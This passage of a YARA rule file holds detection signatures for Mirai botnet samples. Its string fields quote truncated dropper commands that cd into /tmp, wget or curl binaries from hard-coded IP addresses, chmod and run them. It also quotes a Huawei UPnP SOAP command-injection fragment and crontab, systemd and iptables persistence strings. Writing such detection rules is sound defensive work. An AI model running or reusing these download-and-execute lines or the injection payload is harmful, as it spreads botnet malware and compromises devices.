      $s2 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
      $s3 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
      $s4 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
      $s5 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
      $s6 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfaiehg4ewi" ascii /* score: '23.00'*/
      $s7 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mpsl; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mpsl; ./nwfaiehg4e" ascii /* score: '20.00'*/
      $s8 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm7; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm7; ./nwfaiehg4e" ascii /* score: '20.00'*/
      $s9 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.x86_64; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.x86_64; ./nwfaie" ascii /* score: '20.00'*/
      $s10 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mpsl; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mpsl; ./nwfaiehg4e" ascii /* score: '20.00'*/
      $s11 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.x86; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.x86; ./nwfaiehg4ewi" ascii /* score: '20.00'*/
      $s12 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm5; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm5; ./nwfaiehg4e" ascii /* score: '20.00'*/
      $s13 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.sh4; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.sh4; ./nwfaiehg4ewi" ascii /* score: '20.00'*/
      $s14 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.i586; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.i586; ./nwfaiehg4e" ascii /* score: '20.00'*/
      $s15 = "wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm5; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm5; ./nwfaiehg4e" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__bd3775e0 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bd3775e0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd3775e0e67595457887a888878cb55fcf524f80f38952a218ffd71ad0597e39"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "getchal" fullword ascii /* score: '13.00'*/
      $s3 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s4 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s5 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
      $s7 = "systemctl start " fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "systemctl enable " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__de599fc2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_de599fc2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "de599fc285fa0377bfa5a33bc560384384e724cd5464145e2a013e999695ad64"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "getchal" fullword ascii /* score: '13.00'*/
      $s3 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s4 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s5 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
      $s7 = "systemctl start " fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/91.0.4472.120 Mobile Safari/537.36" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "systemctl enable " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      all of them
}

rule Mirai_signature__bfc7f9e6 {
   meta:
      description = "_subset_batch - file Mirai(signature)_bfc7f9e6.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bfc7f9e685308acb0e3307de9ee99e8f710b2ecb1412308b1c7ac2a56b0b97ee"
   strings:
      $s1 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__dd7ef996 {
   meta:
      description = "_subset_batch - file Mirai(signature)_dd7ef996.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd7ef996397753a979ec93c81eb09ebb653a52311fad9d277a2c6bada7045b18"
   strings:
      $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '29.00'*/
      $s2 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s3 = " -l /tmp/ki -r /hmips; /bin/busybox chmod 777 * /tmp/ki; /tmp/ki huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDo" ascii /* score: '25.00'*/
      $s4 = "--login" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__c058fb0d {
   meta:
      description = "_subset_batch - file Mirai(signature)_c058fb0d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c058fb0de3e32c34f7be1494ef72f6230b548327c8e8e42435c01778d7923688"
   strings:
      $s1 = "* hg>:?}J" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__c060648d {
   meta:
      description = "_subset_batch - file Mirai(signature)_c060648d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c060648d383a0964710369ad4c80cb8d3be1583cf30f4ceb99410262162266da"
   strings:
      $s1 = "wget http://158.94.209.216/arm7 -O arm7; chmod +x arm7; ./arm7 fbnew.arm;" fullword ascii /* score: '27.00'*/
      $s2 = "iptables -A INPUT -p tcp -s 204.76.203.206/32 -m multiport --dports 80,8080,8081,8085 -j ACCEPT;" fullword ascii /* score: '20.00'*/
      $s3 = "iptables -A INPUT -p tcp --syn -m multiport --dports 80,8080,8081,8085 -j DROP;" fullword ascii /* score: '17.00'*/
      $s4 = "iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -m multiport --dports 80 -j ACCEPT;" fullword ascii /* score: '15.00'*/
      $s5 = "iptables -F;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7069 and filesize < 1KB and
      all of them
}

rule Mirai_signature__c218a306 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c218a306.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c218a3067ba3d62259fdc61811a686d751fde495914a5ea662f6a08b7ff62018"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.spc; curl -O http://89.213.1" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.ppc; curl -O http://89.213.1" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arm; curl -O http://89.213.1" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arc; curl -O http://89.213.1" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arm; curl -O http://89.213.1" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.spc; curl -O http://89.213.1" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.ppc; curl -O http://89.213.1" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arc; curl -O http://89.213.1" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.m68k; curl -O http://89.213." ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arm7; curl -O http://89.213." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.i468; curl -O http://89.213." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.i686; curl -O http://89.213." ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.sh4; curl -O http://89.213.1" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.arm6; curl -O http://89.213." ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/hiddenbin/boatnet.mips; curl -O http://89.213." ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__c281918d {
   meta:
      description = "_subset_batch - file Mirai(signature)_c281918d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c281918dd34e3be4b1daf3c235fc2a8b17c1fc9c6205a234a2cb5050b3f304a7"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.ppc; curl -O http://72.60." ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arc; curl -O http://72.60." ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arm; curl -O http://72.60." ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.spc; curl -O http://72.60." ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arm6; curl -O http://72.60" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.i468; curl -O http://72.60" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arm; curl -O http://72.60." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arm7; curl -O http://72.60" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.m68k; curl -O http://72.60" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.mpsl; curl -O http://72.60" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.i686; curl -O http://72.60" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.spc; curl -O http://72.60." ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.sh4; curl -O http://72.60." ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.arm5; curl -O http://72.60" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://72.60.108.185/00101010101001/morte.x86_64; curl -O http://72." ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__d1f58617 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d1f58617.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d1f58617f3a7820f3c37bc22d8dcf4345c4a9d2e0a511385fff55465cd0ddb7d"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.arc; curl -O http://41.21" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.spc; curl -O http://41.21" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.ppc; curl -O http://41.21" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.arm; curl -O http://41.21" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.mips; curl -O http://41.2" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.sh4; curl -O http://41.21" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.i686; curl -O http://41.2" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.x86; curl -O http://41.21" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.arm7; curl -O http://41.2" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.mpsl; curl -O http://41.2" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.i468; curl -O http://41.2" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.x86_64; curl -O http://41" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.arm5; curl -O http://41.2" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.m68k; curl -O http://41.2" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://41.216.189.108/00101010101001/morte.arm; curl -O http://41.21" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__dc35aa4c {
   meta:
      description = "_subset_batch - file Mirai(signature)_dc35aa4c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc35aa4c01c11cef05eb3ba05e52fac7de17350edcbfbe10e272f9d98d3ed3bc"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.spc; curl -O http://195.248" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.ppc; curl -O http://195.248" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.arm; curl -O http://195.248" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.arc; curl -O http://195.248" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.spc; curl -O http://195.248" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.arc; curl -O http://195.248" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.ppc; curl -O http://195.248" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.arm; curl -O http://195.248" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.i686; curl -O http://195.24" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.m68k; curl -O http://195.24" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.arm7; curl -O http://195.24" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.sh4; curl -O http://195.248" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.i468; curl -O http://195.24" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.mpsl; curl -O http://195.24" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.248.240.141/hiddenbin/boatnet.mips; curl -O http://195.24" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__e281ad7b {
   meta:
      description = "_subset_batch - file Mirai(signature)_e281ad7b.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e281ad7beef65dd94533978997d6bd5755b3f9f0e5eb6a6fc266063b5571d55b"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arm; curl -O http://37.114.41." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.spc; curl -O http://37.114.41." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.ppc; curl -O http://37.114.41." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arc; curl -O http://37.114.41." ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arm; curl -O http://37.114.41." ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arc; curl -O http://37.114.41." ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.ppc; curl -O http://37.114.41." ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.spc; curl -O http://37.114.41." ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.i686; curl -O http://37.114.41" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.m68k; curl -O http://37.114.41" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.sh4; curl -O http://37.114.41." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arm5; curl -O http://37.114.41" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.arm7; curl -O http://37.114.41" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.i468; curl -O http://37.114.41" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.114.41.96/hiddenbin/boatnet.mpsl; curl -O http://37.114.41" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__e7ed9467 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e7ed9467.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7ed9467b9d9b83a6b707cf616b94ac1d063d11cb87dd584fbe61b0bb74e5cac"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/i468; curl -O http://103.153.69.151/i468; chmo" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arm; curl -O http://103.153.69.151/arm; chmod " ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/spc; curl -O http://103.153.69.151/spc; chmod " ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/mips; curl -O http://103.153.69.151/mips; chmo" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arc; curl -O http://103.153.69.151/arc; chmod " ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/ppc; curl -O http://103.153.69.151/ppc; chmod " ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arm5; curl -O http://103.153.69.151/arm5; chmo" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/spc; curl -O http://103.153.69.151/spc; chmod " ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arm7; curl -O http://103.153.69.151/arm7; chmo" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/m68k; curl -O http://103.153.69.151/m68k; chmo" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/i686; curl -O http://103.153.69.151/i686; chmo" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arc; curl -O http://103.153.69.151/arc; chmod " ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/sh4; curl -O http://103.153.69.151/sh4; chmod " ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/sh4; curl -O http://103.153.69.151/sh4; chmod " ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.153.69.151/arm6; curl -O http://103.153.69.151/arm6; chmo" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      8 of them
}

rule Mirai_signature__f1942896 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f1942896.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f194289631fe35021f88dd3daaee28e4b1e04f03a9697084c472e20330f51db8"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.ppc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.spc; curl -O http://84.201.5" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.mips; curl -O http://84.201." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.ppc; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm5; curl -O http://84.201." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.mpsl; curl -O http://84.201." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arc; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.i686; curl -O http://84.201." ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.sh4; curl -O http://84.201.5" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm6; curl -O http://84.201." ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.i468; curl -O http://84.201." ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.arm7; curl -O http://84.201." ascii /* score: '30.00'*/
